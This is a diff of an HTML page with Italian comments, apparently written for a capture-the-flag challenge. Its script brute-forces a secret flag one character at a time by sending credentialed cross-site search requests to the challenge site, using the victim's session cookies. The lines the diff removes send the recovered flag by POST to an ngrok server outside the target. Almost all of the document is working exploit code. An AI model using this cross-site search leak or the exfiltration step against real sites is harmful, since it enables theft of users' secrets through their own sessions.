@@ -7,17 +7,34 @@
 </head>
 <body>
     <h1>Rubare la Flag dell'Architetto</h1>
+    <div id="results"></div>
 
     <script>
-        const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag';
-        const flagLength = 40; // Sostituisci con la lunghezza esatta della flag
+        const baseUrl = 'https://matrix.capturetheflags.site/search?s=';
+        const maxFlagLength = 40; // Lunghezza massima da testare
         let currentFlag = '';
+        let currentLength = 1; // Inizia dalla lunghezza 1
 
         // Funzione per testare i caratteri della flag
         const testChar = (position) => {
             const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\'; // Caratteri da testare
+
+            if (position >= currentLength) {
+                // Se abbiamo testato tutti i caratteri per la lunghezza corrente
+                if (currentLength < maxFlagLength) {
+                    currentLength++;
+                    currentFlag = ''; // Resettiamo currentFlag per la nuova lunghezza
+                    console.log(`Passando alla lunghezza ${currentLength}`);
+                    testChar(0); // Iniziamo il test per la nuova lunghezza
+                } else {
+                    document.getElementById('results').innerText += `Flag completa: ${currentFlag}\n`;
+                    return; // Termina il processo
+                }
+                return;
+            }
+
             for (let char of chars) {
-                const query = `${baseUrl}${currentFlag}${char}`;
+                const query = `${baseUrl}${currentFlag}${char}`; // Aggiungi il carattere alla query
                 fetch(query, {
                     method: 'GET',
                     credentials: 'include', // Include i cookie di sessione
@@ -27,22 +44,15 @@
                     if (response.ok) {
                         console.log(`Trovato carattere ${char} per la posizione ${position}`);
                         currentFlag += char; // Aggiungi il carattere trovato
-                        if (currentFlag.length < flagLength) {
-                            testChar(currentFlag.length); // Chiama ricorsivamente per la prossima posizione
-                        } else {
-                            console.log(`Flag completa: ${currentFlag}`);
-                            // Invia la flag al server Flask
-                            fetch('https://1e6b-87-4-142-72.ngrok-free.app/receive_flag', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/x-www-form-urlencoded',
-                                },
-                                body: `flag=${encodeURIComponent(currentFlag)}`
-                            })
-                            .then(response => response.text())
-                            .then(data => console.log(data))
-                            .catch(error => console.error('Errore:', error));
-                        }
+                        document.getElementById('results').innerText += `Trovato: ${currentFlag}\n`;
+                        testChar(currentFlag.length); // Chiama ricorsivamente per la prossima posizione
+                        return; // Interrompe il ciclo se trova un carattere valido
+                    } else if (response.status === 404) {
+                        // Se riceviamo un 404 per l'ultimo carattere testato
+                        console.log(`Carattere ${char} non valido per la posizione ${position}, la flag potrebbe essere: ${currentFlag}`);
+                        // Considera la flag completa e termina
+                        document.getElementById('results').innerText += `Flag conclusa: ${currentFlag}\n`;
+                        return; // Termina il processo
                     } else {
                         console.log(`Carattere ${char} non valido per la posizione ${position}`);
                     }
